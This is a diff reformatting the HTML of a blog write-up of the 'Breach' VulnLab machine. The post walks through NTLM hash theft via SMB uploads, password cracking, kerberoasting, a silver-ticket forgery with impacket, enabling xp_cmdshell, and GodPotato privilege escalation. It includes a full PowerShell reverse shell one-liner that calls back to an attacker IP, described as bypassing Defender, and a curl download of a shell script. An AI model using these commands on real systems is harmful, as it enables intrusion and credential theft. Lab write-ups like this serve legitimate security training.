@@ -1,1 +1,185 @@
-<html><head><meta charset="utf-8"></head><body><p><span class="text-huge" style="color:hsl(180, 75%, 60%);"><strong><u>Access as Julia.Wong</u></strong></span></p><p>&nbsp;</p><p>We have anonymous smb access</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:921/271;" src="../img/posts/2025-03-14-Breach(VulnLab)/01-e6fdb98e96.png" width="921" height="271"></figure><p>&nbsp;</p><p>Users found in the users share</p><p>claire.pope<br>diana.pope<br>julia.wong</p><p>&nbsp;</p><p><br>Upload ntlm theft files into the transfer directory to see if we get any hits</p><p>https://github.com/Greenwolf/ntlm_theft</p><p><code>recurse on;</code><br><code>prompt off;</code><br><code>mput *</code></p><figure class="image image-style-block-align-left"><img style="aspect-ratio:939/309;" src="../img/posts/2025-03-14-Breach(VulnLab)/02-b5632a7d78.png" width="939" height="309"></figure><p><br>We capture a hash for Julia.wong</p><figure class="image"><img style="aspect-ratio:1217/138;" src="../img/posts/2025-03-14-Breach(VulnLab)/03-f247831730.png" width="1217" height="138"></figure><p>&nbsp;</p><p>&nbsp;</p><p>Hash cracks to Computer1</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:777/178;" src="../img/posts/2025-03-14-Breach(VulnLab)/04-d1e346d15a.png" width="777" height="178"></figure><p>&nbsp;</p><p>Julia.Wong:Computer1</p><p>&nbsp;</p><p>&nbsp;</p><p><span class="text-huge" style="color:hsl(180, 75%, 60%);"><strong><u>Access as svc_mssql</u></strong></span></p><p>&nbsp;</p><p>We have access to some new shares</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:968/288;" src="../img/posts/2025-03-14-Breach(VulnLab)/05-623bfa847f.png" width="968" height="288"></figure><p>&nbsp;</p><p>&nbsp;</p><p>Nothing interesting in the shares above so next step is grabbing bloodhound data.</p><p><code>bloodhound-python -u julia.wong -d breach.vl -c All -ns 10.10.102.46&nbsp;</code></p><p>&nbsp;</p><p>svc_mssql is kerberoastable</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:1475/708;" src="../img/posts/2025-03-14-Breach(VulnLab)/06-3d33872659.png" width="1475" height="708"></figure><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>Get the hash</p><p><code>impacket-GetUserSPNs -dc-ip 10.10.102.46 breach.vl/julia.wong -request</code></p><p>&nbsp;</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:1201/487;" src="../img/posts/2025-03-14-Breach(VulnLab)/07-686a0f23a3.png" width="1201" height="487"></figure><p>&nbsp;</p><p>&nbsp;</p><p>Hash cracks to Trustno1</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:767/203;" src="../img/posts/2025-03-14-Breach(VulnLab)/08-d50fccd1fd.png" width="767" height="203"></figure><p>&nbsp;</p><p>&nbsp;</p><p>svc_mssql:Trustno1</p><p>&nbsp;</p><p>&nbsp;</p><p><span class="text-huge" style="color:hsl(180, 75%, 60%);"><strong><u>Access to DB admin</u></strong></span></p><p>&nbsp;</p><p>&nbsp;</p><p>We cant really do anything with this access.</p><p>&nbsp;</p><p>I used a hint and we have to perform a silver ticket attack</p><p>&nbsp;</p><p>How does this work?</p><p>When a TGS is presented to the MSSQL service, as long as it is encrypted with the NT hash of the svc_mssql user, it is trusted. Since we have the password for the user, we can easily calculate the NT hash, and forge a ticket, which will allow us to impersonate any user, even a domain admin, in the context of this service.</p><p>Domain admins should have admin privileges over the MSSQL database, so that should get us one step closer to owning this DC.</p><p>To generate the ticket:</p><p><code>impacket-ticketer -nthash 69596C7AA1E8DAEE17F8E78870E25A5C -domain-sid S-1-5-21-2330692793-3312915120-706255856 -domain breach.vl -spn MSSQLSvc/breachdc.breach.vl:1433 Christine.Bruce</code></p><p>You can get the domain-sid via impacket-lookupsid and the NT hash by using an online calculator with the clear-text password.</p><p><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*ZO7nm-KLJbJQIZ3DMmoDTQ.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*ZO7nm-KLJbJQIZ3DMmoDTQ.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*ZO7nm-KLJbJQIZ3DMmoDTQ.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*ZO7nm-KLJbJQIZ3DMmoDTQ.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*ZO7nm-KLJbJQIZ3DMmoDTQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*ZO7nm-KLJbJQIZ3DMmoDTQ.png 1100w, https://miro.medium.com/v2/resize:fit:1022/format:webp/1*ZO7nm-KLJbJQIZ3DMmoDTQ.png 1022w" type="image/webp" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 511px"><source srcset="https://miro.medium.com/v2/resize:fit:640/1*ZO7nm-KLJbJQIZ3DMmoDTQ.png 640w, https://miro.medium.com/v2/resize:fit:720/1*ZO7nm-KLJbJQIZ3DMmoDTQ.png 720w, https://miro.medium.com/v2/resize:fit:750/1*ZO7nm-KLJbJQIZ3DMmoDTQ.png 750w, https://miro.medium.com/v2/resize:fit:786/1*ZO7nm-KLJbJQIZ3DMmoDTQ.png 786w, https://miro.medium.com/v2/resize:fit:828/1*ZO7nm-KLJbJQIZ3DMmoDTQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*ZO7nm-KLJbJQIZ3DMmoDTQ.png 1100w, https://miro.medium.com/v2/resize:fit:1022/1*ZO7nm-KLJbJQIZ3DMmoDTQ.png 1022w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 511px"><img src="../img/posts/2025-03-14-Breach(VulnLab)/09-381c2701f9.png" alt="" width="511" height="118"></picture></p><p>The ticket is saved</p><p>Now, we can authenticate to the MSSQL service as Christine, who is a DA:</p><p><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*fSYA2DzCTHsfB7-IcmYLzg.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*fSYA2DzCTHsfB7-IcmYLzg.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*fSYA2DzCTHsfB7-IcmYLzg.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*fSYA2DzCTHsfB7-IcmYLzg.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*fSYA2DzCTHsfB7-IcmYLzg.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*fSYA2DzCTHsfB7-IcmYLzg.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*fSYA2DzCTHsfB7-IcmYLzg.png 1400w" type="image/webp" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"><source srcset="https://miro.medium.com/v2/resize:fit:640/1*fSYA2DzCTHsfB7-IcmYLzg.png 640w, https://miro.medium.com/v2/resize:fit:720/1*fSYA2DzCTHsfB7-IcmYLzg.png 720w, https://miro.medium.com/v2/resize:fit:750/1*fSYA2DzCTHsfB7-IcmYLzg.png 750w, https://miro.medium.com/v2/resize:fit:786/1*fSYA2DzCTHsfB7-IcmYLzg.png 786w, https://miro.medium.com/v2/resize:fit:828/1*fSYA2DzCTHsfB7-IcmYLzg.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*fSYA2DzCTHsfB7-IcmYLzg.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*fSYA2DzCTHsfB7-IcmYLzg.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"><img src="../img/posts/2025-03-14-Breach(VulnLab)/10-03c6eff55e.png" alt="" width="700" height="311"></picture></p><p>The authentication works, and we are now an admin on the MSSQL</p><p>As we can see, we are now an administrator on the MSSQL server.</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>We can get a reverse shell by bypassing windows defender with this powershell script</p><p><code>$c = New-Object System.Net.Sockets.TCPClient('10.8.4.121',53);$s = $c.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $s.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sb = (iex ". { $data } 2&gt;&amp;1" | Out-String ); $sb2 = $sb + '#';$seb = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($seb,0,$seb.Length);$s.Flush()};$c.Close()</code></p><p>&nbsp;</p><p>Use this one liner to enable xp_cmdshell</p><p><code>EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'whoami';</code></p><p>&nbsp;</p><p>Grab the file</p><p><code>xp_cmdshell curl http://10.8.5.199/defender_shell.ps1 -o C:\Temp\file.ps1</code><br>&nbsp;</p><p>Execute the file</p><p><code>xp_cmdshell powershell -file C:\Temp\file.ps1</code><br>&nbsp;</p><p>&nbsp;</p><p>We get a reverse shell</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:551/183;" src="../img/posts/2025-03-14-Breach(VulnLab)/11-1386475c06.png" width="551" height="183"></figure><p>&nbsp;</p><p>And as usual we have SeImpersonate</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:662/259;" src="../img/posts/2025-03-14-Breach(VulnLab)/12-a49ada4ccb.png" width="662" height="259"></figure><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p><span class="text-huge" style="color:hsl(180, 75%, 60%);"><strong><u>Shell as system</u></strong></span></p><p>&nbsp;</p><p>We can use GodPotato and the same ps1 script from before</p><p>&nbsp;</p><p><code>.\GodPotato-NET4.exe -cmd "powershell -file C:\temp\file.ps1"</code><br>&nbsp;</p><p>&nbsp;</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:1075/1151;" src="../img/posts/2025-03-14-Breach(VulnLab)/13-17015e4159.png" width="1075" height="1151"></figure><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:544/617;" src="../img/posts/2025-03-14-Breach(VulnLab)/14-203788fec2.png" width="544" height="617"></figure></body></html>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <title>VulnLab: Breach | HackWithJordan</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="../assets/css/syntax.css">
+    <style>
+        body {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin: 0;
+            padding: 20px;
+            min-height: 100vh;
+            box-sizing: border-box;
+        }
+
+        .post {
+            width: 100%;
+            max-width: 900px;
+        }
+
+        .terminal {
+            background: #98AFC7;
+            padding: 15px;
+            border-radius: 5px;
+            overflow-x: auto;
+            max-width: 100%;
+            white-space: pre-wrap;
+            word-break: break-word;
+            font-family: monospace;
+            margin: 15px 0;
+        }
+
+        img {
+            max-width: 100%;
+            height: auto;
+            margin: 15px 0;
+            display: block;
+        }
+
+        p {
+            margin: 15px 0;
+            line-height: 1.5;
+            overflow-wrap: anywhere;
+        }
+
+        code {
+            overflow-wrap: anywhere;
+        }
+    </style>
+</head>
+<body>
+
+    <article class="post">
+        <header style="display: flex; align-items: center; gap: 20px;">
+            <img src="../img/posts/2025-03-14-Breach(VulnLab)/01-e6fdb98e96.png" alt="VulnLab: Breach cover" style="height: 80px; border-radius: 4px;">
+            <div>
+                <h1 style="margin: 0;">VulnLab: Breach</h1>
+                <div class="post-meta">March 12, 2025 &bull; VulnLab</div>
+            </div>
+        </header>
+
+        <h1 style="color:red;">Access as Julia.Wong</h1>
+
+        <p>We have anonymous smb access</p>
+
+        <img alt="Screenshot 1" height="271" src="../img/posts/2025-03-14-Breach(VulnLab)/01-e6fdb98e96.png" style="aspect-ratio:921/271;" width="921"/>
+
+        <p>Users found in the users share</p>
+
+        <p>claire.pope<br/>diana.pope<br/>julia.wong</p>
+
+        <p><br/>Upload ntlm theft files into the transfer directory to see if we get any hits</p>
+
+        <p>https://github.com/Greenwolf/ntlm_theft</p>
+
+        <p><code>recurse on;</code><br/><code>prompt off;</code><br/><code>mput *</code></p>
+
+        <img alt="Screenshot 2" height="309" src="../img/posts/2025-03-14-Breach(VulnLab)/02-b5632a7d78.png" style="aspect-ratio:939/309;" width="939"/>
+
+        <p><br/>We capture a hash for Julia.wong</p>
+
+        <img alt="Screenshot 3" height="138" src="../img/posts/2025-03-14-Breach(VulnLab)/03-f247831730.png" style="aspect-ratio:1217/138;" width="1217"/>
+
+        <p>Hash cracks to Computer1</p>
+
+        <img alt="Screenshot 4" height="178" src="../img/posts/2025-03-14-Breach(VulnLab)/04-d1e346d15a.png" style="aspect-ratio:777/178;" width="777"/>
+
+        <p>Julia.Wong:Computer1</p>
+
+        <h1 style="color:red;">Access as svc_mssql</h1>
+
+        <p>We have access to some new shares</p>
+
+        <img alt="Screenshot 5" height="288" src="../img/posts/2025-03-14-Breach(VulnLab)/05-623bfa847f.png" style="aspect-ratio:968/288;" width="968"/>
+
+        <p>Nothing interesting in the shares above so next step is grabbing bloodhound data.</p>
+
+        <pre class="terminal"><code>bloodhound-python -u julia.wong -d breach.vl -c All -ns 10.10.102.46</code></pre>
+
+        <p>svc_mssql is kerberoastable</p>
+
+        <img alt="Screenshot 6" height="708" src="../img/posts/2025-03-14-Breach(VulnLab)/06-3d33872659.png" style="aspect-ratio:1475/708;" width="1475"/>
+
+        <p>Get the hash</p>
+
+        <pre class="terminal"><code>impacket-GetUserSPNs -dc-ip 10.10.102.46 breach.vl/julia.wong -request</code></pre>
+
+        <img alt="Screenshot 7" height="487" src="../img/posts/2025-03-14-Breach(VulnLab)/07-686a0f23a3.png" style="aspect-ratio:1201/487;" width="1201"/>
+
+        <p>Hash cracks to Trustno1</p>
+
+        <img alt="Screenshot 8" height="203" src="../img/posts/2025-03-14-Breach(VulnLab)/08-d50fccd1fd.png" style="aspect-ratio:767/203;" width="767"/>
+
+        <p>svc_mssql:Trustno1</p>
+
+        <h1 style="color:red;">Access to DB admin</h1>
+
+        <p>We cant really do anything with this access.</p>
+
+        <p>I used a hint and we have to perform a silver ticket attack</p>
+
+        <p>How does this work?</p>
+
+        <p>When a TGS is presented to the MSSQL service, as long as it is encrypted with the NT hash of the svc_mssql user, it is trusted. Since we have the password for the user, we can easily calculate the NT hash, and forge a ticket, which will allow us to impersonate any user, even a domain admin, in the context of this service.</p>
+
+        <p>Domain admins should have admin privileges over the MSSQL database, so that should get us one step closer to owning this DC.</p>
+
+        <p>To generate the ticket:</p>
+
+        <pre class="terminal"><code>impacket-ticketer -nthash 69596C7AA1E8DAEE17F8E78870E25A5C -domain-sid S-1-5-21-2330692793-3312915120-706255856 -domain breach.vl -spn MSSQLSvc/breachdc.breach.vl:1433 Christine.Bruce</code></pre>
+
+        <p>You can get the domain-sid via impacket-lookupsid and the NT hash by using an online calculator with the clear-text password.</p>
+
+        <img alt="Screenshot 9" height="118" src="../img/posts/2025-03-14-Breach(VulnLab)/09-381c2701f9.png" width="511"/>
+
+        <p>The ticket is saved</p>
+
+        <p>Now, we can authenticate to the MSSQL service as Christine, who is a DA:</p>
+
+        <img alt="Screenshot 10" height="311" src="../img/posts/2025-03-14-Breach(VulnLab)/10-03c6eff55e.png" width="700"/>
+
+        <p>The authentication works, and we are now an admin on the MSSQL</p>
+
+        <p>As we can see, we are now an administrator on the MSSQL server.</p>
+
+        <p>We can get a reverse shell by bypassing windows defender with this powershell script</p>
+
+        <pre class="terminal"><code>$c = New-Object System.Net.Sockets.TCPClient('10.8.4.121',53);$s = $c.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $s.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sb = (iex ". { $data } 2&gt;&amp;1" | Out-String ); $sb2 = $sb + '#';$seb = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($seb,0,$seb.Length);$s.Flush()};$c.Close()</code></pre>
+
+        <p>Use this one liner to enable xp_cmdshell</p>
+
+        <pre class="terminal"><code>EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'whoami';</code></pre>
+
+        <p>Grab the file</p>
+
+        <pre class="terminal"><code>xp_cmdshell curl http://10.8.5.199/defender_shell.ps1 -o C:\Temp\file.ps1</code></pre>
+
+        <p>Execute the file</p>
+
+        <pre class="terminal"><code>xp_cmdshell powershell -file C:\Temp\file.ps1</code></pre>
+
+        <p>We get a reverse shell</p>
+
+        <img alt="Screenshot 11" height="183" src="../img/posts/2025-03-14-Breach(VulnLab)/11-1386475c06.png" style="aspect-ratio:551/183;" width="551"/>
+
+        <p>And as usual we have SeImpersonate</p>
+
+        <img alt="Screenshot 12" height="259" src="../img/posts/2025-03-14-Breach(VulnLab)/12-a49ada4ccb.png" style="aspect-ratio:662/259;" width="662"/>
+
+        <h1 style="color:red;">Shell as system</h1>
+
+        <p>We can use GodPotato and the same ps1 script from before</p>
+
+        <pre class="terminal"><code>.\GodPotato-NET4.exe -cmd "powershell -file C:\temp\file.ps1"</code></pre>
+
+        <img alt="Screenshot 13" height="1151" src="../img/posts/2025-03-14-Breach(VulnLab)/13-17015e4159.png" style="aspect-ratio:1075/1151;" width="1075"/>
+
+        <img alt="Screenshot 14" height="617" src="../img/posts/2025-03-14-Breach(VulnLab)/14-203788fec2.png" style="aspect-ratio:544/617;" width="544"/>
+    </article>
+
+</body>
+</html>
